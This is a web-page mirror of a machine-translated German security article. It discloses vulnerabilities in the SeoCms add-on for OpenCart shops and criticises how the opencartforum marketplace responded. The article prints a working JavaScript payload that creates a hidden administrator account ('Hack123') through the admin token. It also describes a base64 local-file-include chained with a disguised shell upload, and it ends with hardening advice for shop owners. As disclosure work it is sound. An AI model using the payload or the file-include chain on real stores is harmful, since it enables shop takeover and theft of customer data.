<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>◽️ 🌪️ 🖕🏿 Opencartforum und Freunde ⛅️ ♣️ 👵🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Alle Hunde kommen in den Himmel und alle Besitzer von Online-Shops auf Opencart, früher oder später auf Opencartforum. Wenn die Euphorie von der erste...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum und Freunde</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="Bild"><br><br>  Alle Hunde kommen in den Himmel und alle Besitzer von Online-Shops auf Opencart, früher oder später auf Opencartforum.  Wenn die Euphorie von der ersten Installation der Engine auf dem Hosting vorbei ist und die harte Realität beginnt, vermisst der typische Ladenbesitzer immer etwas und beginnt den schwierigen Weg, qualifizierte Auftragnehmer und Qualitätszusätze für sein Laden zu finden. <br><br>  Die größte Ressource in Runet, auf der Sie beide finden können, ist opencartforum.com, das heute mehr als 140.000 registrierte Benutzer hat.  Von diesen 140.000 Registrierungen sind sogar die Hälfte lebende Personen mit Live-Shops, die Vorlagen oder Module verwenden, die sofort auf der Website gekauft werden können.  Und all diese Leute merken nicht einmal, dass sie zusammen mit den Add-Ons wunderbare Hintertüren und Schwachstellen erwerben, von denen jeder Hacker nur träumen kann. <br><a name="habracut"></a><br>  Obwohl in einer deklarativen Form in den Regeln für das Posten von Add-Ons im Forum Store, ist es in Schwarzweiß geschrieben.  Wir haben qadepartment, speziell geschulte Leute überprüfen Add-Ons auf Schwachstellen. <br><br>  Und weder das Forum als Plattform, die zwischen dem Autor und dem Endbenutzer des Add-Ons vermittelt, noch die Autoren der Add-Ons tragen, wie sich herausstellte, irgendeine Verantwortung. <br>  Wie so?  Und so!  Anscheinend historisch. <br><br>  Wenn ich mir die hypothetischen Konsequenzen der Vorfälle vorstelle, die später besprochen werden, stehen mir die Haare auf dem Kopf zu Berge. <br><br>  Stellen Sie sich vor.  Sie sind ein erfolgreicher Ladenbesitzer, haben seit ein paar Jahren nicht mehr nachts geschlafen, Texte geschrieben, an schwarzem, weißem, grauem SEO geknabbert, gegen Pandas gekämpft, minusinsk, Ihr Getränk nicht zu Ende gebracht, 100.000 Kunden angezogen und in Positionen investiert.  Ihre Kinder gehen in einen guten Kindergarten, und dann ist Ihr Umsatz plötzlich um die Hälfte gesunken, einfach weil Ihre Basis mit allen Kontakten, die Kunden an Wettbewerber gingen.  Oder plötzlich haben Sie es komplett verloren, weil Ihr Geschäft seit einem Monat auf dem MySQL-Server eines anderen arbeitet und Sie die Änderung von kofig nicht einmal bemerkt haben und alle Backups auf dem Hosting schlecht geworden sind. <br><br>  Sie präsentierten ihre Gefühle in einer ähnlichen Situation, arbeiteten, arbeiteten mehrere Jahre und an einem Tag ist alles den Bach runter.  Sie sagen, das kann nicht so sein. <br><br>  Aber es kann sehr einfach sein.  Es reicht aus, nur ein Add-On mit nicht deklariertem unausgesprochenem Schutz vor unbefugter Verwendung zu kaufen, und Ihre Daten können schnell zu Fremden werden! <br><br><h2>  Erster Vorfall </h2><br>  Vor sechs Monaten wurde ein Geschäft oberflächlich verhindert, als ein Ai-Bol- <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Scannerbericht</a> eine seltsame Warnung für einen seltsamen Code im <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SeoCms-</a> Modul zeigte (mehr als 10.000 aktive Installationen). <br><br>  Wir begannen genauer hinzuschauen und es stellte sich heraus, dass dieses Abrakadabra einfach die Version des Add-Ons anzeigt: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  Es ist okay, außer dass: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  Es wird in keiner Weise gefiltert. Wenn versehentlich ein Skript wie das folgende anstelle der Client-Version eingeht, ist es eine Frage der Zeit und der Technik, Administratorzugriff auf ein Geschäft zu erhalten, in dem das Modul installiert ist. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors function​ getUrlVars​()​ {​ v​ar​vars=​​[​],​hash,​​hashes=​​n​ull;​ i​f​​(w​indow​.l​ocation.​h​ref​.i​ndexOf(​"​?"​)​​&amp;&amp; window​.​location.​h​ref.​​indexOf​("​&amp;")​)​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.l​ocation​.h​ref​.i​ndexOf​(​"?"​)​​+ 1)​.​split(​​"&amp;"​); }​​​else​i​f​​(w​indow​.l​ocation.​h​ref​.​indexOf(​​"?"​))​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.​location​.h​ref​.i​ndexOf​(​"?"​)​​+​​1​); }​ i​f​ ​(h​ashes!​=​n​ull)​ ​{​ f​or​​(v​ar​i​=​​0;​​i​&lt;​hashes​.​length​;​i​++)​{​ hash=​​hashes[​​i]​.s​plit​(​"=")​; vars[​h​ash​[0​]​]​​=​hash​[​1]​; }​ }​ r​eturn​vars;​ } var​ url_vars =​ ​ getUrlVars​(); var​ token =​ ​ url_vars.​ ​token​; var​ host ​=​ window.​ ​location​.​origin;​ var​action=​​host+​​"​/admin/index.php?route=user/user/add&amp;token="​+​ token;​ document.​ ​addEventListener​(​"DOMContentLoaded"​,​ ​function​(​event​)​ ​{ $​.p​ost(​​action,​​{​​username​:​​"Hack123"​,​user_group_id​:​​"1"​, firstname​:​"​Lol",​​lastname​:​"​Haha"​,​ email​:​​"Hack123@Hack123.com"​, password:​​"​1234",​​ confirm​:​​"1234"​,​ status​:​​"1"​​}​​); }); &lt;/script&gt;</span></span></code> </pre><br>  Details der Situation werden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> beschrieben.  Administrationshinweis <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . <br><br>  Wahrscheinlich das fünfte Mal, nachdem dieser Prozess für die Forumverwaltung sehr klar modelliert wurde, war es möglich, die Kritikalität der Situation zu vermitteln. <br><br>  Die Verwaltung wiederum hat die Benutzer offiziell über das Vorhandensein dieser Sicherheitsanfälligkeit informiert, und es scheint, dass sie sogar einen Newsletter für Kunden erstellt hat.  Das ist aber nicht richtig. <br><br>  Lassen wir die Bedrohungen und Ausweichmanöver des Autors des Add-Ons hinter den Kulissen und gehen noch zwei Monate zurück ... <br><br><h2>  Zweiter Vorfall </h2><br>  Ein weiteres Geschäft kommt zur Inspektion, in dem sich auf jeder Seite wilde Friese von bis zu 3-4 Sekunden befinden.  Wir beginnen zu sezieren und sehen in dem Ordner mit einem Cache von mehr als 20.000 Dateien mit der Erweiterung .php.  Cache Dateien mit der PHP-Erweiterung Karl, das ist kein Zufall! <br><br>  Wir schauen uns die Datenstruktur dieser Dateien an und dort wieder Teile unseres schönen SEOCMS-Moduls. <br><br>  Und eine großartige Methode: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Dies ist ein Beispiel für eine klassische Sicherheitsanfälligkeit - Local File Include. <br><br>  Es reicht aus, in base64 ../....../config.php zu codieren und hallo - require ($ ajax_file);  Und bitte: Hier haben Sie die Passwörter aus der Datenbank, und hier ist das Systemfehlerprotokoll, und wenn sogar / etc / pwd sehr notwendig ist, obwohl es lange irrelevant war, aber was ist, wenn? <br><br>  Und wie viele Hoster und Server mit Standardeinstellungen leuchten in der Welt von phpmyadmin?  Die Hälfte?  Mehr? <br><br>  Wir beginnen weiter zu suchen und was finden wir?  Wunderbarer Avatar-Download-Code: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Was beim Versuch, die Größe zu ändern, perfekt in einen Fehler gerät (und uns den vollständigen Pfad zur heruntergeladenen Datei anzeigt), nachdem eine Art von shell.php.png geladen wurde, und dann auch von der vorherigen Methode perfekt ausgeführt wird. <br><br>  Video zur Ausnutzung von Sicherheitslücken (mit aktivierter Ausgabe des PHP-Systemfehlers): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Video zur Ausnutzung von Sicherheitslücken (bei deaktivierter Ausgabe des PHP-Systemfehlers): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Die Code-Analyse wurde im April 2019 an der Version von Modul 52 durchgeführt. <br><br>  Da sowohl der Autor als auch die Verwaltung des Forums zu denselben Terminen benachrichtigt wurden und genügend Zeit verstrichen ist, um alle möglichen Maßnahmen zu ergreifen, um Käufer über die Beseitigung von Sicherheitslücken zu informieren, können wir mit gutem Gewissen alle Details offenlegen. <br><br>  Und in diesem Moment passierte etwas.  Auf dem Server des Entwicklers befand sich sein eigenes Modul.  Die Sicherheitsanfälligkeit hat jedoch nicht funktioniert.  Sie war bedeckt ... Und das ist eine große Kuriosität.  Sehr groß !!! <br><br>  Und die zweite Kuriosität dieser ganzen Geschichte ist, dass das OpenCartforum in der Person der Verwaltung und der Abteilung für Qualitätskontrolle von Add-Ons weder den ersten noch den zweiten Vorfall sah und in beiden Fällen bei der ersten Benachrichtigung nichts Kritisches fand. <br><br>  Natürlich gibt es nichts Kritisches, wenn Ihre Konfigurationen in der Welt glänzen.  Es ist nichts Kritisches, wenn eine gute Hälfte der Ladenbesitzer nicht weiß, was unter ihrer Haube vor sich geht.  Immerhin hat jemand dieses Add-On einmal installiert, und ohne Mailing merkt er nicht einmal, dass das gesamte Unternehmen direkt bedroht ist. <br><br>  Und wenn es beim ersten Vorfall zu einer deutlichen Reaktion der Verwaltung gekommen ist, werden beim zweiten alle Beiträge mit einer Erwähnung gelöscht.  Und all dies wird durch ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Forumangebot</a> abgedeckt, wonach über kommerzielle Ergänzungen Kommentare wie über die Toten hinterlassen werden können - entweder gut oder nichts. <br><br>  Der Autor behauptet auch, dass die Fehler und Löcher behoben sind, qadepartment das Add-On zum Verkauf verpasst hat, aber nein, die Löcher sind nicht behoben ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () ist noch da.  Die Eingabe ist leicht gefiltert.  Aber das potenzielle LFI lebte und lebt.  Wenn ein bisschen mehr, dann ja, jetzt können wir die Shell weder laden noch ausführen.  Angenommen, wir haben versucht, die Ausführung von Skripten mit Ausnahme von index.php und sogar auf der Ebene der Nginx-Konfiguration, auf die auf keinen Fall zugegriffen werden kann, geschlossen, zementiert.  Aber irgendwo anders hatte der böse Hacker die Möglichkeit, eine beliebige Datei in den Cache-Ordner zu legen.  Was wird passieren?  Das ist richtig - um fremden Code auszuführen und einen Hash in der get-Anfrage zu generieren, dauert es zwei Minuten.  Das heißt, am Ende stellt sich heraus, dass es irgendwie geschlossen ist, aber es ist irgendwie nicht vollständig. <br><br>  Nun, die kleinen Dinge: Wie so wunderschöne Beziehungen in den Sprachdateien leuchteten: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Und sie leuchten ... Sie möchten den vollständigen Weg zur Wurzel des Projekts kennen.  Suchen Sie einfach den Speicher mit aktivierter Fehleranzeige und führen Sie den Link direkt zur Sprachdatei aus. <br><br>  Um zu untersuchen, was nach der Aktualisierung des Add-Ons in Megabyte Codezeilen des Autors noch alles möglich ist, gibt es weder Ressourcen noch Wünsche.  Dafür gibt es speziell ausgebildete Verantwortliche. <br><br>  Und die Kirsche auf dem Kuchen.  Wir erinnern uns, wir haben ein kommerzielles Add-On ... Und in einem kommerziellen Add-On haben wir Text in der Ressource des Autors versteckt: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Interessanterweise kennt mindestens einer der Add-On-Käufer ein so „wunderbares“ Osterei? <br><br>  Heute wird die Ergänzung sowohl verkauft als auch verkauft.  Beiträge mit Aufrufen zur Beachtung der Situation werden einfach gelöscht.  Keiner der Käufer erhielt Warnmeldungen über den zweiten Vorfall.  Vielleicht haben 20 bis 30% der Add-On-Benutzer ein Update durchgeführt, aber 70% - selbst wenn wir über die Statistiken des offiziellen Autors zur Verwendung von Add-Ons sprechen - sind dies 7000 Geschäfte (tatsächlich mehr - da niemand genau weiß, wie viele Kopien von Freiberuflern in Kundengeschäften installiert wurden erweiterte Lizenz) befinden sich in einer riesigen Risikozone. <br><br>  Mit den Worten von Baron Münchhausen möchte ich nur eines sagen: Aktualisierte Herren! <br><br><h2>  Für Kunden </h2><br>  Was tun, diejenigen, die in diesem sinkenden U-Boot gelandet sind: <br><br><ul><li>  Lassen Sie keinen Müll auf FTP.  Zeigen Sie info.php, adminer.php und alle anderen Abfälle an.  Sie sollten nur index.php und einen Punkt haben. </li><li>  Ändern Sie regelmäßig Passwörter, alle Passwörter (FTP, Admin-Panel, Datenbank).  Und stellen Sie sicher, dass Sie nicht versehentlich besonders seltsame Konten haben. </li><li>  Fehlerausgabe deaktivieren.  Wenn Sie nicht arbeiten, schalten Sie die Fehlerausgabe immer auf der Interpreter-Konfigurationsebene und nicht in den Speichereinstellungen aus. </li><li>  Ja, ich weiß, dass dies nicht sehr machbar ist, aber Sie sollten zumindest über Aktualisierungen des Engine-Codes in Bezug auf die Sicherheit auf dem Laufenden bleiben und die Engine im Idealfall regelmäßig auf stabile Versionen aktualisieren. </li><li>  Schauen Sie sich regelmäßig die Protokolle der Besuche an, es kann viele interessante Dinge geben.  Verfolgen Sie Anomalien. </li><li>  Schließen Sie zusätzlich mit einem Passwort oder einer Einschränkung des IP-Administrators des Stores und verschiedener anfälliger Bereiche, wie z. B. phpmyadmin.  Wenn dies eine Freigabe ist, bei der phpmyadmin allen gemeinsam ist, laufen Sie vor einem solchen Hosting davon! </li><li>  Wenn Sie sxd und ähnliche Dienstprogramme verwenden, benennen Sie diese sofort in einen zufälligen Zeichensatz um. </li><li>  Bei Verwendung von nginx lohnt es sich, der Konfiguration des virtuellen Hosts Regeln hinzuzufügen, die das Ausführen anderer PHP-Skripte als index.php im Stamm- und Administratorbereich der Site verbieten. </li><li>  Werfen Sie keinen Müll von Ihrem Konto.  Wenn Sie ein Geschäft haben, dann lassen Sie es ein Geschäft sein.  Laden Sie nicht unter einem Konto eine Reihe von WP-Blogs, eine Reihe von Fehlern und verschiedene Testdomänen. </li><li>  Speichern Sie niemals Sicherungen einer Site oder Datenbank im Stammverzeichnis Ihres virtuellen Hosts. </li><li>  Beobachten Sie die Auslastung des Servers / Hostings, versuchen Sie, die Versorgung mindestens x2 von Spitzenlasten fernzuhalten, und versuchen Sie, den Grund herauszufinden, wenn die Auslastung plötzlich ohne Grund plötzlich zunimmt.  Besser überholen als nicht überholen! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de466283/">https://habr.com/ru/post/de466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de466263/index.html">Benchmark-RPC-Systeme (und Inverted Json)</a></li>
<li><a href="../de466267/index.html">Warum unterschätzen viele ihre Spiele?</a></li>
<li><a href="../de466271/index.html">Gemeinsame Kurse zwischen Gruppe IB und Belkasoft: Was wir unterrichten und wer kommen wird</a></li>
<li><a href="../de466279/index.html">Die meisten Android-Geräte sind anfällig für Phishing-Angriffe per SMS</a></li>
<li><a href="../de466281/index.html">Virtuelle Realität, Open Source-Spiele und Elektroautos: Was John Carmack im Podcast Joe Rogan sagte</a></li>
<li><a href="../de466285/index.html">Ein kleines Werbegeschenk: Tombola Combo DVR und Radarwarner</a></li>
<li><a href="../de466287/index.html">2019 National Internet Segments Reliability Research & Report</a></li>
<li><a href="../de466289/index.html">Legislative Initiativen. Seltsam, aber der Staatsduma vorgestellt</a></li>
<li><a href="../de466291/index.html">Nachhaltigkeitsumfrage der nationalen Internet-Segmente für 2019</a></li>
<li><a href="../de466295/index.html">Schmerzloser Fallback-Cache auf Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
